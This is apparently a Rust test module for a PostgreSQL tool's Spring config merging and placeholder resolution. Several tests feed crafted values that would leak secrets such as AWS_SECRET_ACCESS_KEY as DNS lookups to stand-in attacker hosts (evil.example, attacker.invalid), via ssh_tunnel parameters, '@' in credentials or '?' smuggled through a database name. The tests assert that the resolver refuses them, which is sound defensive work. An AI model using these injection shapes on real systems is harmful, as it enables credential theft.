        let profile = vec![partial("ds", Some(""), Some(""), Some(""))];
        let merged = merge_partials(&base, &profile);
        assert_eq!(merged[0].url.as_deref(), Some("jdbc:postgresql://h/x"));
        assert_eq!(merged[0].username.as_deref(), Some("u"));
        assert_eq!(merged[0].password.as_deref(), Some("p"));
    }

    #[test]
    fn merge_appends_profile_only_prefix() {
        let base = vec![partial(
            "primary",
            Some("jdbc:postgresql://h/a"),
            None,
            None,
        )];
        let profile = vec![partial(
            "replica",
            Some("jdbc:postgresql://h/b"),
            None,
            None,
        )];
        let merged = merge_partials(&base, &profile);
        assert_eq!(
            merged.iter().map(|p| p.prefix.as_str()).collect::<Vec<_>>(),
            vec!["primary", "replica"]
        );
    }

    #[test]
    fn merge_profile_url_overrides_base_url() {
        let base = vec![partial(
            "ds",
            Some("jdbc:postgresql://dev/x"),
            Some("u"),
            None,
        )];
        let profile = vec![partial("ds", Some("jdbc:postgresql://prod/x"), None, None)];
        let merged = merge_partials(&base, &profile);
        assert_eq!(merged[0].url.as_deref(), Some("jdbc:postgresql://prod/x"));
        assert_eq!(merged[0].username.as_deref(), Some("u"));
    }

    #[test]
    fn split_config_name_separates_family_and_profile() {
        assert_eq!(
            split_config_name("application"),
            ("application".into(), None)
        );
        assert_eq!(
            split_config_name("application-prod"),
            ("application".into(), Some("prod".into()))
        );
        assert_eq!(
            split_config_name("bootstrap-dev"),
            ("bootstrap".into(), Some("dev".into()))
        );
        // Trailing dash → treated as no profile.
        assert_eq!(
            split_config_name("application-"),
            ("application-".into(), None)
        );
    }

    #[test]
    fn properties_outrank_yaml_for_base_merge() {
        // Spring resolves .properties over .yml/.yaml; the higher rank
        // must sort later so it overlays (wins) during the base merge.
        assert!(
            format_precedence_rank("application.properties")
                > format_precedence_rank("application.yml")
        );
        assert_eq!(
            format_precedence_rank("application.yml"),
            format_precedence_rank("application.yaml")
        );
        assert!(format_precedence_rank("application.yaml") > format_precedence_rank("weird.txt"));
        assert_eq!(format_precedence_rank("APPLICATION.PROPERTIES"), 2);
    }

    #[test]
    fn yaml_partials_overlay_end_to_end() {
        // Base supplies url + username; profile overlay supplies
        // only the password. The merge yields a complete block.
        let base_yaml =
            "spring:\n  datasource:\n    url: jdbc:postgresql://db/orders\n    username: app\n";
        let prof_yaml = "spring:\n  datasource:\n    password: prod-secret\n";
        let base = parse_yaml_partials(base_yaml);
        let prof = parse_yaml_partials(prof_yaml);
        let merged = merge_partials(&base, &prof);
        let ds = merged
            .iter()
            .find(|p| p.prefix == "spring.datasource")
            .expect("datasource prefix");
        assert_eq!(ds.url.as_deref(), Some("jdbc:postgresql://db/orders"));
        assert_eq!(ds.username.as_deref(), Some("app"));
        assert_eq!(ds.password.as_deref(), Some("prod-secret"));
    }

    #[test]
    fn resolve_placeholders_no_placeholders_is_unchanged() {
        let got = resolve_placeholders("jdbc:postgresql://h:5432/app", |_| None);
        assert_eq!(got, Ok("jdbc:postgresql://h:5432/app".to_string()));
    }

    #[test]
    fn resolve_placeholders_plain_name_resolves_from_lookup() {
        let got = resolve_placeholders("${DB_HOST}", |n| {
            (n == "DB_HOST").then(|| "db.internal".to_string())
        });
        assert_eq!(got, Ok("db.internal".to_string()));
    }

    #[test]
    fn resolve_placeholders_embeds_resolved_value_in_surrounding_text() {
        let got = resolve_placeholders("jdbc:postgresql://${DB_HOST}:5432/app", |n| {
            (n == "DB_HOST").then(|| "db.internal".to_string())
        });
        assert_eq!(
            got,
            Ok("jdbc:postgresql://db.internal:5432/app".to_string())
        );
    }

    #[test]
    fn resolve_placeholders_name_with_default_prefers_lookup() {
        let got = resolve_placeholders("${DB_HOST:localhost}", |n| {
            (n == "DB_HOST").then(|| "db.internal".to_string())
        });
        assert_eq!(got, Ok("db.internal".to_string()));
    }

    #[test]
    fn resolve_placeholders_name_with_default_falls_back_when_unset() {
        let got = resolve_placeholders("${DB_HOST:localhost}", |_| None);
        assert_eq!(got, Ok("localhost".to_string()));
    }

    #[test]
    fn resolve_placeholders_unset_no_default_is_an_error() {
        let got = resolve_placeholders("${DB_HOST}", |_| None);
        assert_eq!(got, Err(vec!["DB_HOST".to_string()]));
    }

    #[test]
    fn resolve_placeholders_collects_every_unresolved_name() {
        let got = resolve_placeholders("${DB_HOST}/${DB_NAME}", |_| None);
        assert_eq!(got, Err(vec!["DB_HOST".to_string(), "DB_NAME".to_string()]));
    }

    #[test]
    fn resolve_placeholders_reports_bare_bodies_never_wrapped_ones() {
        // Consumers render an entry as `${entry}`; an entry that
        // already carried its own `${…}` produced `${${…}}`.
        let nested = resolve_placeholders("${DB_HOST:${FALLBACK}}", |_| None).unwrap_err();
        assert_eq!(nested, vec!["DB_HOST:${FALLBACK}".to_string()]);
        let unterminated =
            resolve_placeholders("jdbc:postgresql://${DB_HOST", |_| None).unwrap_err();
        assert_eq!(unterminated, vec!["DB_HOST".to_string()]);
        for entry in nested.iter().chain(unterminated.iter()) {
            assert!(
                !entry.starts_with("${"),
                "entry should be a bare body, got {entry:?}"
            );
        }
    }

    #[test]
    fn resolve_url_placeholders_never_resolves_the_host() {
        // The whole point: DB_HOST *is* set, and it still doesn't get
        // substituted, because a resolved value in the host position
        // leaves the machine as a DNS lookup to whoever wrote the URL.
        let got = resolve_url_placeholders("jdbc:postgresql://${DB_HOST}/orders", |n| {
            (n == "DB_HOST").then(|| "db.internal".to_string())
        });
        assert_eq!(got.in_host, vec!["DB_HOST".to_string()]);
        assert!(got.missing.is_empty());
        assert_eq!(got.value, "jdbc:postgresql://${DB_HOST}/orders");
        assert!(!got.is_clean());
    }

    #[test]
    fn resolve_url_placeholders_never_resolves_the_port() {
        let got = resolve_url_placeholders("jdbc:postgresql://db:${DB_PORT}/orders", |_| {
            Some("5432".to_string())
        });
        assert_eq!(got.in_host, vec!["DB_PORT".to_string()]);
        assert_eq!(got.value, "jdbc:postgresql://db:${DB_PORT}/orders");
    }

    #[test]
    fn resolve_url_placeholders_resolves_user_password_and_dbname() {
        let got = resolve_url_placeholders(
            "jdbc:postgresql://${DB_USER}:${DB_PW}@db.internal:5432/${DB_NAME}",
            |n| match n {
                "DB_USER" => Some("svc".into()),
                "DB_PW" => Some("s3cret".into()),
                "DB_NAME" => Some("orders".into()),
                _ => None,
            },
        );
        assert!(got.is_clean(), "unexpected: {got:?}");
        assert_eq!(
            got.value,
            "jdbc:postgresql://svc:s3cret@db.internal:5432/orders"
        );
    }

    #[test]
    fn resolve_url_placeholders_reports_an_unset_username() {
        let got = resolve_url_placeholders("jdbc:postgresql://${DB_USER}@db/orders", |_| None);
        assert_eq!(got.missing, vec!["DB_USER".to_string()]);
        assert!(got.in_host.is_empty(), "the user is not the host");
    }

    #[test]
    fn resolve_url_placeholders_userinfo_default_containing_an_at_still_splits_right() {
        let got =
            resolve_url_placeholders("jdbc:postgresql://${DB_USER:me@corp}@db/orders", |_| None);
        assert!(got.in_host.is_empty(), "host is literal `db`: {got:?}");
        assert_eq!(got.value, "jdbc:postgresql://me@corp@db/orders");
    }

    #[test]
    fn resolve_url_placeholders_without_a_scheme_refuses_everything() {
        // `spring.datasource.url=${SPRING_DATASOURCE_URL}` — there's no
        // host component to protect, so the whole value is off limits.
        let got = resolve_url_placeholders("${SPRING_DATASOURCE_URL}", |_| {
            Some("jdbc:postgresql://evil/db".to_string())
        });
        assert_eq!(got.in_host, vec!["SPRING_DATASOURCE_URL".to_string()]);
        assert_eq!(got.value, "${SPRING_DATASOURCE_URL}");
    }

    #[test]
    fn resolve_url_placeholders_scheme_placeholder_refuses_everything() {
        let got =
            resolve_url_placeholders("${SCHEME}://${DB_USER}@host/db", |_| Some("x".to_string()));
        assert_eq!(
            got.in_host,
            vec!["SCHEME".to_string(), "DB_USER".to_string()]
        );
        assert_eq!(got.value, "${SCHEME}://${DB_USER}@host/db");
    }

    #[test]
    fn resolve_url_placeholders_never_resolves_a_url_parameter() {
        // `ssh_tunnel=` is read out of the query string by
        // `conn::Dsn::parse` and pgman spawns `ssh` to it. Resolving a
        // placeholder there is the host hole in another component:
        // the secret leaves the machine as the bastion's hostname.
        let got = resolve_url_placeholders(
            "jdbc:postgresql://localhost:5432/app?ssh_tunnel=${SECRET}.evil.example",
            |n| (n == "SECRET").then(|| "hunter2".to_string()),
        );
        assert_eq!(got.in_host, vec!["SECRET".to_string()]);
        assert!(!got.is_clean());
        assert_eq!(
            got.value, "jdbc:postgresql://localhost:5432/app?ssh_tunnel=${SECRET}.evil.example",
            "the param must stay literal — a resolved one is connectable"
        );
        assert!(
            !got.value.contains("hunter2"),
            "the resolved value must never reach the URL: {got:?}"
        );
    }

    #[test]
    fn resolve_url_placeholders_refuses_a_dbname_that_resolves_into_a_parameter() {
        // The database name IS resolvable — so the env-controlled way
        // to reach the same tunnel is to smuggle a `?` through it.
        let got = resolve_url_placeholders("jdbc:postgresql://localhost:5432/${DB_NAME}", |n| {
            (n == "DB_NAME").then(|| "db?ssh_tunnel=x.evil.com".to_string())
        });
        assert!(!got.is_clean(), "must be refused: {got:?}");
        assert_eq!(got.in_host, vec!["DB_NAME".to_string()]);
        assert_eq!(
            got.value, "jdbc:postgresql://localhost:5432/${DB_NAME}",
            "a refused URL keeps its literal text — no half-resolved DSN"
        );
        assert!(!got.value.contains("evil.com"));
    }

    #[test]
    fn resolve_url_placeholders_refuses_a_username_that_resolves_past_the_at() {
        // `@` in the value moves the userinfo/host split, so the value
        // chooses the host after all.
        let got = resolve_url_placeholders("jdbc:postgresql://${DB_USER}@db/orders", |n| {
            (n == "DB_USER").then(|| "me@evil.example".to_string())
        });
        assert!(!got.is_clean(), "must be refused: {got:?}");
        assert_eq!(got.value, "jdbc:postgresql://${DB_USER}@db/orders");
    }

    #[test]
    fn resolve_url_placeholders_plain_url_is_unchanged_and_clean() {
        let got =
            resolve_url_placeholders("jdbc:postgresql://h:5432/app?sslmode=require", |_| None);
        assert!(got.is_clean());
        assert_eq!(got.value, "jdbc:postgresql://h:5432/app?sslmode=require");
    }

    /// The security-review reproduction: this resolver cut the authority
    /// at the first `/` and saw the placeholder in the path;
    /// `conn::Dsn::parse` cuts at the last `@` and saw it as the host.
    const PARSER_DISAGREEMENT_URL: &str =
        "jdbc:postgresql://x@db.example/app@${AWS_SECRET_ACCESS_KEY}.attacker.invalid:55432/db";

    #[test]
    fn resolve_url_placeholders_refuses_a_placeholder_the_parser_reads_as_the_host() {
        let got = resolve_url_placeholders(PARSER_DISAGREEMENT_URL, |n| {
            (n == "AWS_SECRET_ACCESS_KEY").then(|| "LEAKED".to_string())
        });
        assert_eq!(
            got.in_host,
            vec!["AWS_SECRET_ACCESS_KEY".to_string()],
            "must be refused as host-tainting: {got:?}"
        );
        assert_eq!(
            got.value, PARSER_DISAGREEMENT_URL,
            "a refused URL keeps its literal text"
        );
        assert!(!got.value.contains("LEAKED"));
        assert!(!got.is_clean());
    }

    #[test]
    fn resolve_url_placeholders_still_resolves_userinfo_and_dbname_beside_params() {
        // The benign shape every Spring project has, with the two params
        // the cross-check compares byte for byte.
        let got = resolve_url_placeholders(
            "jdbc:postgresql://${DB_USER}:${DB_PASSWORD}@db.internal:5432/${DB_NAME}\
             ?sslmode=require&ssh_tunnel=tom@bastion",
            |n| match n {
                "DB_USER" => Some("svc".into()),
                "DB_PASSWORD" => Some("s3cret".into()),
                "DB_NAME" => Some("orders".into()),
                _ => None,
            },
        );
        assert!(got.is_clean(), "unexpected: {got:?}");
        assert_eq!(
            got.value,
            "jdbc:postgresql://svc:s3cret@db.internal:5432/orders\
             ?sslmode=require&ssh_tunnel=tom@bastion"
        );
    }

    #[test]
    fn resolve_url_placeholders_refuses_a_password_that_resolves_to_hold_an_at() {
        // An `@` in the password moves the parser's userinfo/host split:
        // `svc:p@evil.example@db.internal` still parses to `db.internal`
        // today, but the value has changed the authority's shape and the
        // structural check refuses it before the parser is even asked.
        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal:5432/orders";
        let got = resolve_url_placeholders(url, |n| {
            (n == "DB_PASSWORD").then(|| "p@evil.example".to_string())
        });
        assert!(!got.is_clean(), "must be refused: {got:?}");
        assert_eq!(got.in_host, vec!["DB_PASSWORD".to_string()]);
        assert_eq!(got.value, url);
        assert!(!got.value.contains("evil"));
    }

    #[test]
    fn resolve_url_placeholders_refuses_a_template_the_parser_cannot_read() {
        // Fail closed: a template `conn::Dsn::parse` cannot read is one
        // it cannot vouch for, however this resolver placed the
        // placeholder.
        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal:notaport/orders";
        let got = resolve_url_placeholders(url, |_| Some("x".to_string()));
        assert_eq!(got.in_host, vec!["DB_PASSWORD".to_string()]);
        assert_eq!(got.value, url);
    }

    #[test]
    fn resolve_url_placeholders_a_colon_in_the_password_stays_in_the_userinfo() {
        // `:` is not a structural character, and the parser splits the
        // userinfo on its *first* `:` — so the value stays a password and
        // the cross-check must not mistake it for a port.
        let url = "jdbc:postgresql://svc:${DB_PASSWORD}@db.internal/orders";
        let got = resolve_url_placeholders(url, |_| Some("p:99".to_string()));
        assert!(
            got.is_clean(),
            "a `:` in the password stays in the userinfo: {got:?}"
        );
        assert_eq!(got.value, "jdbc:postgresql://svc:p:99@db.internal/orders");
    }

    #[test]
    fn placeholder_bodies_lists_every_body_in_order() {
        assert_eq!(
            placeholder_bodies("${A}.${B:x}.plain.${C"),
            vec!["A".to_string(), "B:x".to_string(), "C".to_string()]
        );
        assert!(placeholder_bodies("no placeholders").is_empty());
    }

    #[test]
    fn resolve_placeholders_nested_placeholder_is_an_error() {
        // Spring itself can resolve a placeholder's default as another
        // placeholder; this parser doesn't attempt that and flags it
        // instead of guessing.
        let got = resolve_placeholders("${DB_HOST:${FALLBACK_HOST}}", |_| None);
        assert!(got.is_err(), "expected nested placeholder to be flagged");
    }

    #[test]
    fn resolve_placeholders_unterminated_is_an_error() {
        let got = resolve_placeholders("jdbc:postgresql://${DB_HOST", |_| None);
        assert!(
            got.is_err(),
            "expected unterminated placeholder to be flagged"
        );
    }

    #[test]
    fn resolve_placeholders_env_round_trip() {
        // Exercises the real intended lookup — std::env::var — with a
        // properties file's raw placeholder value.
        // SAFETY: this test doesn't run concurrently with another
        // test reading/writing the same var name; the name is unique
        // to this test.
        unsafe {
            std::env::set_var("PGMAN_TEST_RESOLVE_DB_HOST", "db.example.test");
        }
        let got = resolve_placeholders("${PGMAN_TEST_RESOLVE_DB_HOST}", |n| std::env::var(n).ok());
        unsafe {
            std::env::remove_var("PGMAN_TEST_RESOLVE_DB_HOST");
        }
        assert_eq!(got, Ok("db.example.test".to_string()));
    }
}
